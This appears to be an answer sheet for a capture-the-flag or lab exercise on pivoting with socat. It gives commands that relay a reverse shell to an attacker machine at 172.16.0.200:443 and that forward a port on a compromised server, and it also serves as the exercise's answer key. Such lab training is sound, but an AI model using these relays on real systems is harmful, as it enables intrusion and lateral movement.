							Pivoting Socat
						------------------------------

1. Which socat option allows you to reuse the same listening port for more than one connection?
ans: reuseaddr

2. If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? Use TCP port 8000 for the server listener, and do not background the process. 
ans: ./socat tcp-l:8000 tcp:172.16.0.200:443

3. What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
ans: ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

4. Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.
ans: auto-complete
